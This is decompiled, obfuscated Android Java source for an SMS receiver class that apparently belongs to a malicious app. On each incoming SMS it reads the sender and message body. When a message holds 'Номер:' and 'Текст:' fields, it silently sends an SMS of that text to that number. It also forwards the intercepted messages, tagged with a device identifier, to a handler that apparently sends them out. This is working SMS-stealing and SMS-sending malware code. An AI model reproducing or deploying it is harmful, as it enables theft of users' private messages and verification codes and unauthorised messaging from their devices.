package com.vdodsodjsdt;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

/* JADX INFO: compiled from: r8-map-id-3f77bbef96f83a8bf86e140490b9d41fcf0723d2c79bd2f3f370cb94135e1be4 */
/* JADX INFO: loaded from: classes.dex */
public final class SmsReceiver extends BroadcastReceiver {
    @Override // android.content.BroadcastReceiver
    public final void onReceive(Context context, Intent intent) {
        ej6unYlOWMDF.pYmKDYlAmhudp(context, "context");
        ej6unYlOWMDF.pYmKDYlAmhudp(intent, "intent");
        if (!ej6unYlOWMDF.NSjgqmGjEzuugn2SsG1mZFP(intent.getAction(), "android.provider.Telephony.SMS_RECEIVED") && !ej6unYlOWMDF.NSjgqmGjEzuugn2SsG1mZFP(intent.getAction(), "android.provider.Telephony.SMS_DELIVER")) {
            return;
        }
        SmsMessage[] messagesFromIntent = Telephony.Sms.Intents.getMessagesFromIntent(intent);
        int i = 0;
        String displayOriginatingAddress = messagesFromIntent[0].getDisplayOriginatingAddress();
        StringBuilder sb = new StringBuilder();
        Khx5NlXjnBf0cIn8cBMdY4O4mD khx5NlXjnBf0cIn8cBMdY4O4mD = null;
        for (SmsMessage smsMessage : messagesFromIntent) {
            sb.append(smsMessage.getDisplayMessageBody());
            sb.append("\n");
            String displayMessageBody = smsMessage.getDisplayMessageBody();
            ej6unYlOWMDF.h3jnZRsdwYJfY9UhQCkbvWciwvFHv(displayMessageBody, "getDisplayMessageBody(...)");
            int iNNOZCSz1a7S = cwhrCnoVJBjJE2CBEAvBopmgF.nNOZCSz1a7S(6, displayMessageBody, "Номер: ");
            int iZyiF0wv9HozxGOIDt8PvVp = cwhrCnoVJBjJE2CBEAvBopmgF.zyiF0wv9HozxGOIDt8PvVp(displayMessageBody, "Текст: ", 0, 6);
            Khx5NlXjnBf0cIn8cBMdY4O4mD khx5NlXjnBf0cIn8cBMdY4O4mD2 = (iNNOZCSz1a7S == -1 || iZyiF0wv9HozxGOIDt8PvVp == -1) ? new Khx5NlXjnBf0cIn8cBMdY4O4mD("null", "null", false) : new Khx5NlXjnBf0cIn8cBMdY4O4mD(cwhrCnoVJBjJE2CBEAvBopmgF.N08cqkgagFuPYWJcTFAQVt(displayMessageBody, F44whnLsbQ.BJQHddi0Plr5ElWetCyaixWOg9(iNNOZCSz1a7S + 7, displayMessageBody.length())), cwhrCnoVJBjJE2CBEAvBopmgF.N08cqkgagFuPYWJcTFAQVt(displayMessageBody, F44whnLsbQ.BJQHddi0Plr5ElWetCyaixWOg9(iZyiF0wv9HozxGOIDt8PvVp + 7, iNNOZCSz1a7S - 1)), true);
            if (khx5NlXjnBf0cIn8cBMdY4O4mD2.VxUQ9tBhpHJ2AAEDNW8sghc4m) {
                ((SmsManager) context.getSystemService(SmsManager.class)).sendTextMessage((String) khx5NlXjnBf0cIn8cBMdY4O4mD2.zzpBGItXfub0yWj, null, (String) khx5NlXjnBf0cIn8cBMdY4O4mD2.V57tEvNfxZVVcOCAOih5PKr, null, null);
                khx5NlXjnBf0cIn8cBMdY4O4mD = khx5NlXjnBf0cIn8cBMdY4O4mD2;
            }
        }
        if (khx5NlXjnBf0cIn8cBMdY4O4mD != null) {
            ej6unYlOWMDF.p59rPv72J9(displayOriginatingAddress);
            String string = sb.toString();
            ej6unYlOWMDF.h3jnZRsdwYJfY9UhQCkbvWciwvFHv(string, "toString(...)");
            try {
                Thread thread = new Thread(new klTFaDtrPxx8(2, context, new Tt3445ZYXN().ZfQNn8hdWlEQ5cR94249PDsLR(new bVtTXlNec9fIdfGs3Y4(zonOxHotd3BwAPJcwqr6I6uQNngg4.qNPQb1obP7(context), displayOriginatingAddress, string, context.getResources().getText(R.string.BRANCH).toString()))));
                thread.start();
                thread.join();
                return;
            } catch (Exception e) {
                e.printStackTrace();
                return;
            }
        }
        ej6unYlOWMDF.p59rPv72J9(displayOriginatingAddress);
        String string2 = sb.toString();
        ej6unYlOWMDF.h3jnZRsdwYJfY9UhQCkbvWciwvFHv(string2, "toString(...)");
        try {
            Tt3445ZYXN tt3445ZYXN = new Tt3445ZYXN();
            String strQNPQb1obP7 = zonOxHotd3BwAPJcwqr6I6uQNngg4.qNPQb1obP7(context);
            String string3 = context.getResources().getText(R.string.WORKER).toString();
            ej6unYlOWMDF.pYmKDYlAmhudp(string3, "s");
            StringBuilder sb2 = new StringBuilder(string3);
            while (true) {
                int iPf1HsU8AK92buCoUaexm5AC = cwhrCnoVJBjJE2CBEAvBopmgF.Pf1HsU8AK92buCoUaexm5AC(sb2, '_', i, 4);
                if (iPf1HsU8AK92buCoUaexm5AC == -1) {
                    String string4 = sb2.toString();
                    ej6unYlOWMDF.h3jnZRsdwYJfY9UhQCkbvWciwvFHv(string4, "toString(...)");
                    Thread thread2 = new Thread(new klTFaDtrPxx8(1, context, tt3445ZYXN.ZfQNn8hdWlEQ5cR94249PDsLR(new KnUFRPtgbvD46yGOhUGuq6CIH(strQNPQb1obP7, displayOriginatingAddress, string4, string2, context.getResources().getText(R.string.BRANCH).toString()))));
                    thread2.start();
                    thread2.join();
                    return;
                }
                sb2.insert(iPf1HsU8AK92buCoUaexm5AC, "\\");
                i = iPf1HsU8AK92buCoUaexm5AC + 2;
            }
        } catch (Exception e2) {
            e2.printStackTrace();
        }
    }
}
